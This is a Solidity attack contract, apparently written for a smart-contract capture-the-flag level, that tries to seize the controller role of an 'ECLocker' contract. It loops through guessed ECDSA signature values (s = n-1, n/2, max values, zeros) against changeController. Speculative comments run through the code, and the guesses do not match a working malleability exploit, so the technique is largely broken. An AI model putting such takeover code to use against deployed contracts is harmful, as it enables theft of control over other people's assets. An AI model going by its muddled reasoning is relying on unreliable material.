// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function controller() external view returns (address);
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function msgHash() external view returns (bytes32);
    function usedSignatures(bytes32) external view returns (bool);
}

contract TakeoverAttack {
    IECLocker public locker;
    address public deployer;
    
    event Debug(string message, bytes32 value);
    event DebugAddress(string message, address value);
    
    constructor(address _locker) {
        locker = IECLocker(_locker);
        deployer = msg.sender;
    }
    
    function attack() external {
        // The vulnerability is that signature validation can be bypassed
        // The signature hash is computed as:
        // keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]))
        
        // This creates a uint256[3] array and encodes it
        // The key insight is that we need to find a collision or bypass
        
        // Let's try edge cases in ecrecover
        // When ecrecover fails, it returns address(0)
        // But the controller is not address(0)
        
        // Wait, let me check if there's already a used signature
        // Maybe we can exploit the signature reuse check
        
        // Actually, the real issue might be that we can create
        // two different signatures that hash to the same value
        // due to how the array is encoded
        
        // Let's try malleable signatures
        // For ECDSA, if (r,s) is valid, then (r, n-s) is also valid
        // where n is the curve order
        
        uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        
        // Try with specific values that might cause issues
        uint8 v = 27;
        bytes32 r = bytes32(uint256(1));
        bytes32 s = bytes32(uint256(n - 1)); // This is n-1
        
        try locker.changeController(v, r, s, deployer) {
            emit Debug("Success with v=27, r=1, s=n-1", bytes32(0));
        } catch {
            // Try another approach
            v = 28;
            try locker.changeController(v, r, s, deployer) {
                emit Debug("Success with v=28, r=1, s=n-1", bytes32(0));
            } catch {
                // Try with s = n/2
                s = bytes32(n / 2);
                v = 27;
                try locker.changeController(v, r, s, deployer) {
                    emit Debug("Success with v=27, r=1, s=n/2", bytes32(0));
                } catch {
                    // Last attempt - try to exploit the array encoding
                    tryArrayExploit();
                }
            }
        }
    }
    
    function tryArrayExploit() internal {
        // The signature hash computation might have issues
        // Let's try values that could cause encoding problems
        
        uint8 v = 27;
        bytes32 r = bytes32(type(uint256).max);
        bytes32 s = bytes32(type(uint256).max);
        
        try locker.changeController(v, r, s, deployer) {
            emit Debug("Success with max values", bytes32(0));
        } catch {
            // Try with zero values
            v = 0;
            r = bytes32(0);
            s = bytes32(0);
            
            try locker.changeController(v, r, s, deployer) {
                emit Debug("Success with zero values", bytes32(0));
            } catch {
                emit Debug("All attempts failed", bytes32(0));
            }
        }
    }
    
    function getController() external view returns (address) {
        return locker.controller();
    }
}